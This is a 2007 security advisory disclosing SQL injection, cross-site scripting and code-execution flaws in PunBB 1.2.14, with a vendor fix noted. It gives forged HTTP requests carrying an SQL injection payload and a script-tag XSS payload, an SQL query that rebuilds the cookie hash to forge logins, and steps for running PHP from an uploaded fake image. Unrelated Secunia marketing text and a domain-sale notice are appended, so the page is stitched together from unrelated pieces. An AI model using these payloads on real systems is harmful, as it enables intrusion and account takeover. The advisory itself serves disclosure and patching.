 Title: PunBB <= 1.2.14 Multiple Vulnerabilities
Author: DarkFig < gmdarkfig (at) gmail (dot) com >
Written on: 2007/04/08
Released on: 2007/04/11
Risk level: High
URL: http://www.acid-root.new.fr/advisories/13070411.txt
Summary: SQL Injection, Cross site scripting, Code execution
Solution: A new version of PunBB (1.2.15) has been released.
-=[ DESCRIPTION ]
PunBB is a fast and lightweight PHP-powered discussion board. It is
released under the GNU General Public License. Its primary goals are
to be faster, smaller and less graphically intensive as compared to
other discussion boards. PunBB has fewer features than many other
discussion boards, but is generally faster and outputs smaller,
semantically correct XHTML-compliant pages.
-=[ VULN #1 ]
Risk level: Medium
Type: SQL Injection
Conditions: PHP <= 4.4.2 or PHP <= 5.1.3
register\_globals=On
ini\_get() problem
The "search.php" file contains the following php code:
49| if (isset($\_GET['action']) || isset($\_GET['search\_id']))
| [...]
54| if (isset($search\_id)) unset($search\_id);
55|
56| // If a search\_id was supplied
57| if (isset($\_GET['search\_id']))
58| {
59| $search\_id = intval($\_GET['search\_id']);
60| if ($search\_id < 1)
61| message($lang\_common['Bad request']);
62| }
| [...]
100| if (isset($search\_id))
104| $result = $db->query('SELECT search\_data FROM '.$db->prefix
| .'search\_cache WHERE id='.$search\_id.' AND ident=\''
| .$db->escape($ident).'\'') or [...]
When I did see this code, I thought that there was an SQL Injection with
the Zend\_Hash\_Del\_Key\_Or\_Index vulnerability and register\_globals=On.
But let's see another file, the "include/common.php" file contains
the following code:
39| // Reverse the effect of register\_globals
40| if (@ini\_get('register\_globals'))
41| unregister\_globals();
If ini\_get('register\_globals') returns TRUE, the unregister\_globals()
function is called. The "@" has been used if an error occured (Warning..),
because on many servers this function is disabled for security reasons.
It's the case on my server, if I remove @, I obtain this :
Warning: ini\_get() has been disabled for security reasons in [...]
In this case, ini\_get('register\_globals') returns FALSE even if
register\_globals=On, so unregister\_globals() isn't called. The
unregister\_globals() functions contains the following code:
1037| function unregister\_globals()
1038| {
1039| // Prevent script.php?GLOBALS[foo]=bar
1040| if (isset($\_REQUEST['GLOBALS']) || isset($\_FILES['GLOBALS']))
1041| exit('bip bip biiiiiiiip');
1042|
1043| // Variables that shouldn't be unset
1044| $no\_unset = array('GLOBALS', '\_GET', '\_POST', '\_COOKIE',
| '\_REQUEST', '\_SERVER', '\_ENV', '\_FILES');
1045|
1046| // Remove elements in $GLOBALS that are present in any of
| the superglobals
1047| $input = array\_merge($\_GET, $\_POST, $\_COOKIE, $\_SERVER, $\_ENV,
| $\_FILES, isset($\_SESSION) && is\_array($\_SESSION) ? $\_SESSION : array());
1048| foreach ($input as $k => $v)
1049| {
1050| if (!in\_array($k, $no\_unset) && isset($GLOBALS[$k]))
1051| {
1052| unset($GLOBALS[$k]);
1053| unset($GLOBALS[$k]); // zend\_hash\_del\_key\_or\_index protection
1054| }
1055| }
1056| }
If register\_globals=On and if there is a problem (see [1] / [2] for
example) concerning the ini\_get() function, there is an SQL Injection
(with the Zend\_Hash\_Del\_Key\_Or\_Index vulnerability). The attacker will
forge an HTTP packet which looks like this:
GET /punbb1-2-14/search.php?action=show\_new HTTP/1.1\r\n
Host: localhost\r\n
Connection: keep-alive\r\n
Cookie: punbb\_cookie=<thecookiehere>\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 55\r\n\r\n
search\_id=-1%20OR%201%3D1%23&1986084953=1&-1234899993=1\r\n\r\n
After getting the password (hashed), you don't need to break it. As
Nms (see [3]) said, it's easy to forge a cookie. Let's see the
check\_cookie() function:
39| if (isset($\_COOKIE[$cookie\_name]))
40| list($cookie['user\_id'], $cookie['password\_hash']) =
| @unserialize($\_COOKIE[$cookie\_name]);
| [...]
49| if (!isset($pun\_user['id']) || md5($cookie\_seed.$pun\_user['password']) !==
| $cookie['password\_hash'])
The $cookie\_seed value is stored in the "config.php" file, but we
can retrieve it with an SQL request (with the SQL Injection). The hash
stored in the cookie ($cookie['password\_hash']) looks like this:
mysql> SELECT MD5(
-> CONCAT(
-> SUBSTR(
-> MD5(
-> /\* $cookie\_seed value \*/
-> (SELECT registered FROM users WHERE LENGTH(registered)=10
-> ORDER BY registered LIMIT 1)),-8),
-> /\* The hashed password \*/
-> (SELECT password FROM users WHERE id=<user\_id>)))
-> /\* Ouput -> f4684bb1418c241992c6b8f9d70a4edb \*/;
The solution is quite simple, in "include/common.php", remove the
condition ("if(ini\_get...") and even if ini\_get('register\_globals')
returns FALSE, apply the unregister\_globals() function.
-=[ VULN #2 ]
Risk level: Low
Type: Cross Site Scripting
Conditions: none
In the "misc.php" file the "Referer" header isn't properly filtered
before being used. The file contains the following code:
128| $redirect\_url = (isset($\_SERVER['HTTP\_REFERER']) &&
| preg\_match('#^'.preg\_quote($pun\_config['o\_base\_url']).'/(.\*?)\.php#i',
| $\_SERVER['HTTP\_REFERER'])) ? $\_SERVER['HTTP\_REFERER'] : 'index.php';
| [...]
146| <input type="hidden" name="redirect\_url" value="
| <?php echo $redirect\_url ?>" />
This can lead to cross site scripting attacks, for example send this
HTTP packet (with a valid email id):
GET http://localhost/punbb1-2-14/misc.php?email=3 HTTP/1.1\r\n
Host: localhost\r\n
Referer: http://localhost/punbb1-2-14/misc.php?email=3"><script>alert(1)</script>
\r\n
Connection: keep-alive\r\n
Cookie: punbb\_cookie=<thecookie>\r\n\r\n
If the attacker knows how to use Ajax, it's quite easy to exploit (with
setRequestHeader). But let's see how this can be used...
-=[ VULN #3 ]
Risk level: High
Type: Code execution
Conditions: none
With punBB an XSS can lead to ... php code execution ! We can
use the 'Referer' XSS to lead this attack. There is also another XSS
in the admin pannel . When we add a category (admin\_categories.php)
like '<script>alert(1)</script>', the code is executed when we wanna
remove the created category. Now, serious things begin ... The script
"footer.php" contains the following code:
136| $tpl\_temp = trim(ob\_get\_contents());
137| $tpl\_main = str\_replace('<pun\_footer>', $tpl\_temp, $tpl\_main);
138| ob\_end\_clean();
| [...]
143| while (preg\_match('#<pun\_include "([^/\\\\]\*?)">#', $tpl\_main, $cur\_include))
144| {
145| if (!file\_exists(PUN\_ROOT.'include/user/'.$cur\_include[1]))
146| error('[...]');
147|
148| ob\_start();
149| include PUN\_ROOT.'include/user/'.$cur\_include[1];
150| $tpl\_temp = ob\_get\_contents();
151| $tpl\_main = str\_replace($cur\_include[0], $tpl\_temp, $tpl\_main);
152| ob\_end\_clean();
153| }
So if the content of the page contains '<pun\_include "file.php"', if
the file is situated in 'include/user/', the file will be include. We
can't use \\ or /, but it's not enough protected. With the
"admin\_options.php" file, we can change the avatars directory. Let's
change this parameter to "include/user". By now when a user will upload a
file, the file will be uploaded in "include/user". If the user uploads a
fake JPG file (which contains php code) , the file will be situated in
"include/user". Now the attacker have to include the uploaded file. He
will execute the php code with the XSS (<pun\_include "my\_id.jpg">). An
exploit has been released [4].

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

The domain name (without content) is available for sale by its owner through Sedo's Domain Marketplace. Any offer you submit is binding for 7 days. All quoted prices are final prices.

This domain may be listed as a fundamental term by Afnic. Domains listed as fundamental terms are subject to certain registration and trade restrictions.
It is your responsibility to make sure that all of the conditions that are specific to fundamental term domains are fulfilled before bidding and purchasing this domain. These requirements include:
• Why do you wish to register and/or trade this domain?
• What are your reasons/goals for registering/trading this domain?
After receiving these answers, Afnic may request additional documentation from the owner's registrar. Only then will Afnic determine whether or not to approve the registration/trade.
Important Notice:
In order to purchase a .FR domain and successfully transfer it into your ownership, you must have a personal address in Europe, or a business presence with an associated address in Europe.
Please note that it is a requirement of the .FR registry that any registrant of a .FR domain has a European address. If you do not meet either of these requirements, then you will have to transfer the domain to a registrar that provides a trustee service, i.e. a legal proxy address in France.
